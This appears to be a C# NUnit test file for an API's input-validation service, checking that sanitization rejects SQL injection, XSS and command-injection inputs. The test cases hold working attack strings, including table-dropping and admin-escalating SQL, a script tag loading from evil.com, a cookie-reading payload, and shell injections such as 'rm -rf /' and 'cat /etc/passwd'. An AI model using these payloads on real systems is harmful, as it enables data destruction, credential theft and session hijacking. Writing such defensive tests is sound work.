using NUnit.Framework;
using SafeVaultAPI.Services;
using Microsoft.Extensions.Logging;
using Moq;

namespace SafeVaultTests;

/// <summary>
/// Tests for input validation to detect and prevent security vulnerabilities
/// Includes tests for SQL injection, XSS, and other injection attacks
/// </summary>
[TestFixture]
public class TestInputValidation
{
    private IInputValidationService _validationService = null!;
    private Mock<ILogger<InputValidationService>> _loggerMock = null!;

    [SetUp]
    public void Setup()
    {
        _loggerMock = new Mock<ILogger<InputValidationService>>();
        _validationService = new InputValidationService(_loggerMock.Object);
    }

    #region SQL Injection Tests

    [Test]
    [TestCase("admin' OR '1'='1")]
    [TestCase("admin'; DROP TABLE Users; --")]
    [TestCase("admin' UNION SELECT * FROM Users --")]
    [TestCase("'; DELETE FROM Users WHERE '1'='1")]
    [TestCase("admin'--")]
    [TestCase("' OR 1=1--")]
    [TestCase("admin' /*")]
    [TestCase("1' AND '1'='1")]
    public void TestForSQLInjection_ShouldSanitizeCommonSQLInjectionPatterns(string maliciousInput)
    {
        // Act
        var sanitized = _validationService.SanitizeInput(maliciousInput);
        var validationResult = _validationService.ValidateUsername(maliciousInput);

        // Assert - Dangerous SQL characters should be removed
        Assert.That(sanitized, Does.Not.Contain("'"), "Single quotes should be removed");
        Assert.That(sanitized, Does.Not.Contain(";"), "Semicolons should be removed");
        Assert.That(sanitized, Does.Not.Contain("--"), "SQL comments should be removed");
        Assert.That(validationResult.IsValid, Is.False, "SQL injection patterns should fail validation");
        
        Console.WriteLine($"Original: {maliciousInput}");
        Console.WriteLine($"Sanitized: {sanitized}");
        Console.WriteLine($"Validation: {validationResult.ErrorMessage}");
    }

    [Test]
    public void TestForSQLInjection_ComplexAttackPattern()
    {
        // Arrange - Complex SQL injection attempt
        var maliciousInput = "'; UPDATE Users SET IsAdmin=1 WHERE Username='admin'; --";

        // Act
        var sanitized = _validationService.SanitizeInput(maliciousInput);

        // Assert
        Assert.That(sanitized, Does.Not.Contain("'"));
        Assert.That(sanitized, Does.Not.Contain(";"));
        Assert.That(sanitized, Does.Not.Contain("--"));
        Assert.That(sanitized, Does.Not.Contain("UPDATE"));
        
        Console.WriteLine($"Complex SQL Injection blocked: {maliciousInput} -> {sanitized}");
    }

    [Test]
    [TestCase("admin' OR '1'='1' --", ExpectedResult = false)]
    [TestCase("1'; DROP TABLE Users; --", ExpectedResult = false)]
    [TestCase("validuser123", ExpectedResult = true)]
    public bool TestForSQLInjection_UsernameValidation(string input)
    {
        // Act
        var result = _validationService.ValidateUsername(input);

        // Assert
        Console.WriteLine($"Input: {input}, Valid: {result.IsValid}, Error: {result.ErrorMessage}");
        return result.IsValid;
    }

    #endregion

    #region XSS (Cross-Site Scripting) Tests

    [Test]
    [TestCase("<script>alert('XSS')</script>")]
    [TestCase("<img src=x onerror=alert('XSS')>")]
    [TestCase("<svg/onload=alert('XSS')>")]
    [TestCase("javascript:alert('XSS')")]
    [TestCase("<iframe src='malicious.com'></iframe>")]
    [TestCase("<body onload=alert('XSS')>")]
    [TestCase("<script src='http://evil.com/xss.js'></script>")]
    public void TestForXSS_ShouldSanitizeScriptTags(string maliciousInput)
    {
        // Act
        var sanitized = _validationService.SanitizeInput(maliciousInput);

        // Assert - HTML/Script tags should be neutralized
        Assert.That(sanitized, Does.Not.Contain("<"), "Opening angle brackets should be removed");
        Assert.That(sanitized, Does.Not.Contain(">"), "Closing angle brackets should be removed");
        Assert.That(sanitized, Does.Not.Contain("script"), "Script keyword should be removed");
        Assert.That(sanitized, Does.Not.Contain("javascript"), "JavaScript keyword should be removed");
        
        Console.WriteLine($"Original XSS: {maliciousInput}");
        Console.WriteLine($"Sanitized: {sanitized}");
    }

    [Test]
    [TestCase("<script>alert(document.cookie)</script>")]
    [TestCase("&lt;script&gt;alert('XSS')&lt;/script&gt;")]
    public void TestForXSS_CookieStealingAttempt(string maliciousInput)
    {
        // Act
        var sanitized = _validationService.SanitizeInput(maliciousInput);
        var validationResult = _validationService.ValidateUsername(maliciousInput);

        // Assert
        Assert.That(sanitized, Does.Not.Contain("<"));
        Assert.That(sanitized, Does.Not.Contain(">"));
        Assert.That(sanitized, Does.Not.Contain("&"));
        Assert.That(validationResult.IsValid, Is.False, "XSS attempts should fail validation");
        
        Console.WriteLine($"Cookie stealing attempt blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("<img src=x onerror=alert('XSS')>", ExpectedResult = false)]
    [TestCase("normaltext", ExpectedResult = true)]
    public bool TestForXSS_EmailValidation(string input)
    {
        // Act - Try to inject XSS in email field
        var email = input.Contains("@") ? input : $"{input}@test.com";
        var result = _validationService.ValidateEmail(email);

        // Assert
        Console.WriteLine($"Email Input: {email}, Valid: {result.IsValid}");
        return result.IsValid;
    }

    [Test]
    public void TestForXSS_JavascriptInEmail()
    {
        // Act
        var result = _validationService.ValidateEmail("javascript:void(0)@test.com");
        
        // After sanitization, the result may be valid but sanitized
        // The important thing is that dangerous content is removed
        var sanitized = _validationService.SanitizeInput("javascript:void(0)");
        
        // Assert
        Assert.That(sanitized, Does.Not.Contain("javascript"), "JavaScript keyword should be removed");
        Console.WriteLine($"Original: javascript:void(0)@test.com");
        Console.WriteLine($"Sanitized: {sanitized}@test.com");
    }

    #endregion

    #region Command Injection Tests

    [Test]
    [TestCase("test; rm -rf /")]
    [TestCase("test | cat /etc/passwd")]
    [TestCase("test && whoami")]
    [TestCase("test`whoami`")]
    [TestCase("test$(whoami)")]
    public void TestForCommandInjection_ShouldRemoveDangerousCharacters(string maliciousInput)
    {
        // Act
        var sanitized = _validationService.SanitizeInput(maliciousInput);

        // Assert
        Assert.That(sanitized, Does.Not.Contain(";"), "Semicolons should be removed");
        Assert.That(sanitized, Does.Not.Contain("|"), "Pipes should be removed");
        Assert.That(sanitized, Does.Not.Contain("&"), "Ampersands should be removed");
        Assert.That(sanitized, Does.Not.Contain("`"), "Backticks should be removed");
        Assert.That(sanitized, Does.Not.Contain("$"), "Dollar signs should be removed");
        Assert.That(sanitized, Does.Not.Contain("("), "Parentheses should be removed");
        
        Console.WriteLine($"Command injection blocked: {maliciousInput} -> {sanitized}");
    }

    #endregion

    #region Valid Input Tests

    [Test]
    [TestCase("john_doe", ExpectedResult = true)]
    [TestCase("user123", ExpectedResult = true)]
    [TestCase("Test_User_2024", ExpectedResult = true)]
    [TestCase("validusername", ExpectedResult = true)]
    public bool TestValidUsername_ShouldPass(string validInput)
    {
        // Act
        var result = _validationService.ValidateUsername(validInput);

        // Assert
        Console.WriteLine($"Valid username test: {validInput} -> {result.IsValid}");
        return result.IsValid;
    }

    [Test]
    [TestCase("user@example.com", ExpectedResult = true)]
    [TestCase("test.user@domain.co.uk", ExpectedResult = true)]
    [TestCase("valid_email123@test.com", ExpectedResult = true)]
    public bool TestValidEmail_ShouldPass(string validInput)
    {
        // Act
        var result = _validationService.ValidateEmail(validInput);

        // Assert
        Console.WriteLine($"Valid email test: {validInput} -> {result.IsValid}");
        return result.IsValid;
    }

    #endregion

    #region Edge Cases

    [Test]
    public void TestEmptyInput_ShouldFail()
    {
        // Act
        var usernameResult = _validationService.ValidateUsername("");
        var emailResult = _validationService.ValidateEmail("");

        // Assert
        Assert.That(usernameResult.IsValid, Is.False);
        Assert.That(emailResult.IsValid, Is.False);
    }

    [Test]
    public void TestNullInput_ShouldFail()
    {
        // Act
        var usernameResult = _validationService.ValidateUsername(null!);
        var emailResult = _validationService.ValidateEmail(null!);

        // Assert
        Assert.That(usernameResult.IsValid, Is.False);
        Assert.That(emailResult.IsValid, Is.False);
    }

    [Test]
    public void TestExcessiveLength_ShouldFail()
    {
        // Arrange
        var longString = new string('a', 200);

        // Act
        var result = _validationService.ValidateUsername(longString);

        // Assert
        Assert.That(result.IsValid, Is.False);
        Assert.That(result.ErrorMessage, Does.Contain("3 and 100"));
    }

    #endregion
}
